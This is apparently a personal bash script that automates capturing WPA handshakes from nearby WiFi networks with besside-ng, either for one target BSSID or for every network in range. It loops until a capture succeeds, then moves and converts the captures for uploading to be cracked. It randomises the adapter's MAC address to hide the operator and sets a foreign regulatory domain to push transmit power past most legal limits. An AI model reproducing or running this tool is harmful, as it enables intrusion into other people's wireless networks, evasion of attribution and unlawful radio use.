#!/bin/bash

clear

# Optional Argument 1 = besside id to crack
# Optional Argument 2 = WiFi device to use
# Optional Argument 3 = Monitoring device to use

# Some Vars
crack_ssid="$1"

# Test for help
function display_help {
	echo "Help:"
	echo $0" optional arguments,"
	echo $0" <besside id> to crack only or '' or nothing, to crack all. BESSIDE must contain the colon separators."
	echo $0" '' <WiFi Device> to use for monitoring."
	echo $0" '' <WiFi Device> <Monitoring Device> in case it does not detect the device for monitoring correctly."
	echo ""
	echo "If WiFi device not specified, defaults to wlan1."
	echo "If monitoring device not specified, defaults to mon0."
	echo ""

}

# Load my Uni Functions script for some functions to use.
function load_uni_functions() {
	# use my custom functions
	
	test_true=false
	
	source "uni_functions.sh" #2>/dev/null
	if [ "$?" -eq 0 ]; then
		test_true=true
	fi
	
	if [ "$test_true" == false ]; then
		uni_functions_path=$(./find_up.sh . -name "uni_functions.sh")
		echo "UNI Functions Path: $uni_functions_path"
		test_true=false
		
		source "$uni_functions_path" #2>/dev/null
		if [ "$?" -eq 0 ]; then
			test_true=true
		fi
	fi
	
	if [ "$test_true" = false ]; then
		echo "Could not source the Uni System Functions (uni_functions.sh)"
		exit
	else
		echo "UNI Functions Loaded"
	fi
}

# Does all the legwork of making sure we can get the monitoring device setup
function setup_wifi_monitoring() {

	# Enable WiFi devices by drivers if disabled. Soft-unblock.
	# If the hardware key was used, hard-block, it will still not turn on.
	# rfkill list for details
	$rfkill_var unblock wifi
	sleep 1

	ifconfig_var=$(loc_file "ifconfig")

	# Wait for the specified WiFi device to appear. Sometimes a newly plugged in USB Wifi device will take a min to be available.
	echo "Waiting for Wifi device: $wifi_device, to appear"
	$ifconfig_var $wifi_device >/dev/null 2>&1
	device_found=$?
	secs=120								# Duration to wait
	endTime=$(( $(date +%s)+$secs )) 	# Calc end time

	until [ "$device_found" -eq 0 ] || [ $(date +%s) -gt $endTime ]; do
		sleep 2
		$ifconfig_var $wifi_device >/dev/null 2>&1
		device_found=$?
	done
	if [ $device_found -eq 0 ]; then
		echo "Device available for use."
	else
		echo " "
		echo " Timed out waiting for device $wifi_device to appear."
		
		exit 1
	fi

	$airmon_ng_var stop $mon_device
	# $iwconfig_var $wifi_device mode managed

	$ifconfig_var $wifi_device down

	sleep 1
	iwconfig_var=$(loc_file "iwconfig")
	$iwconfig_var $wifi_device mode monitor

	sleep 1
	macchanger_var=$(loc_file "macchanger")
	$macchanger_var -r $wifi_device >/dev/null 2>&1

	$ifconfig_var $wifi_device up

	sleep 1

	goodexec=-1
	counter=0
	until [ "$goodexec" -eq 0 ]; do

		if [ "$counter" -gt 5 ]; then
			echo "Cannot get AirMon-NG to start "$wifi_device
			exit 57
		fi

		# Odd error here on the PwnPi for Raspberry Pi computer
		# The first run of the airmon-ng will produce an error and a odd "rename5" network device.
		# This next run will work ok and allow the use of mon0 interface.
		#	Old code: $airmon_ng_var start $wifi_device
		# Looking to parse this for the monitoring interface. It's not always mon0...
		#	var="(mac80211 monitor mode already enabled for [phy0]wlan1 on [phy0]wlan1)"
		captured_output=$($airmon_ng_var start $wifi_device)
		goodexec=$?
		mon_device=$(echo $captured_output | awk -F"monitor mode enabled on " '{print $2}' | cut -d ")" -f 1)
		# If the monitor mode is already enabled...
		if [ "$mon_device" == "" ]; then
			mon_device=$(echo $captured_output | awk -F"monitor mode already enabled for " '{print $2}' | cut -d "]" -f 3 | cut -d ")" -f 1)
		fi
		#echo ""
		#echo "Captured Output: " $captured_output
		echo "Detected Monitoring device: "$mon_device
		#exit -1

		counter=$((counter+1))

		sleep 1
	done
	# Report how  many times it took to start Airmon-ng
	if [ "$counter" -gt 1 ]; then
		echo "	It took airmon-ng $counter tries to start."
	fi

	# Turn wifi power on MAX
	iw reg set BO >/dev/null 2>&1 # Bolivia allows max power of 27db. Most places are restricted to a lower power level
	$iwconfig_var $wifi_device channel 13 >/dev/null 2>&1 # Some other people online say this may allow you to set it if it does not work without it. 13 is not U.S. friendly.
	$iwconfig_var $wifi_device txpower 30 >/dev/null 2>&1 # Set power level.

	sleep 1
}

# Does all the legwork of making sure we can get the monitoring device setup
function unsetup_wifi_monitoring() {
	$airmon_ng_var stop $mon_device >/dev/null 2>&1
	$airmon_ng_var stop $wifi_device >/dev/null 2>&1

	$ifconfig_var $wifi_device down >/dev/null 2>&1
	iw $mon_device del >/dev/null 2>&1
	$macchanger_var -p $wifi_device >/dev/null 2>&1

}

function run_besside() {
	# Capture handshakes...
	# If the program besside-ng errors out with "wi_read() No such file or directory", try deleting the besside.log.
	if [ "$crack_ssid" != "" ]; then
		echo $(date)" Cracking "$crack_ssid" with BESSIDE"
		echo $(date)" Cracking "$crack_ssid" with BESSIDE" >> "$besside_log"
		$besside_ng_var -b $crack_ssid $mon_device
		besside_error_code=$?
	else
		echo $(date)" Cracking all with BESSIDE..."
		echo $(date)" Cracking all with BESSIDE" >> "$besside_log"
		$besside_ng_var $mon_device -v
		besside_error_code=$?
	fi

	return $besside_error_code
}

if [ "$1" != "" ]; then
	if [ "$1" == "--help" ] || [ "$1" == "-h" ]; then # || [ "$1" != "${1/:/}" ]
		display_help
		exit
	fi
fi

# Run as root user
if [ "$UID" -ne "0" ] ; then
	echo "The programs require running as root."
	display_help
	exit 67
else
	echo "[$(date "+%F %T")] User id check successful"
fi

# Script Vars
if [ "$2" != "" ]; then
	wifi_device="$2"
else
	wifi_device="wlan1"
	#wifi_device="wlan0"
fi
echo "WiFi device set to: "$wifi_device

if [ "$3" != "" ]; then
	# Use argument specified for monitoring device
	mon_device="$3"
else
	# Go with defaults
	mon_device="mon0"
	#wifi_device="wlan1"
fi
echo "Monitoring device set to: "$mon_device

# Load my Uni Functions script for some functions to use.
load_uni_functions

cd_current_script_dir

# find program locations and execute as needed
echo "Looking for required file: besside-ng"
besside_ng_var=$(loc_file "besside-ng" "required")
if [ $? -eq 1 ]; then
	exit 1
else
	echo "BESSIDE: $besside_ng_var"
fi

echo "Looking for required file: airmon-ng"
airmon_ng_var=$(loc_file "airmon-ng" "required")
echo "AIRMON: $airmon_ng_var"

echo "Looking for required file: rfkill"
rfkill_var=$(loc_file "rfkill" "required")
echo "RFKILL: $rfkill_var"

besside_error_code=-1
exit_loop=false
# Keep looping until canceled with an exit of 0 or some key press exit code
until [ $besside_error_code -eq 0 ] || [ exit_loop == true ]; do

	read -t 0 -r -s -n1 choice    # read single character in silent mode
	if [[ "$choice" == $'\e' ]]; then 	# if input == ESC key
		exit_loop=true
		echo "Exiting Loop"
	fi

	# Sets network wifi devices for monitoring
	setup_wifi_monitoring

	# Future use. Currently gets the uni_machine_name.
	gather_machine_details

	besside_log=$uni_machine_name"_besside.log"
	if [ ! -e "$besside_log" ]; then
		echo "Created Log: $besside_log"
		touch "$besside_log" 2>/dev/null
	fi


	# Move the .caps (from last run, if it errored out) to another directory for processing
	./move_caps.sh

	# Run the function that will run besside to capture handshakes
	run_besside


	# If the besside exits with an error, start over.
	# This is because the wifi device could have been pulled,
	# or an error like wi_read()

done

# Undo the wifi monitoring device
unsetup_wifi_monitoring

# Move the .caps to another directory for processing
./move_caps.sh

cd caps
./convert_caps_for_uploading.sh

cd ..

exit 0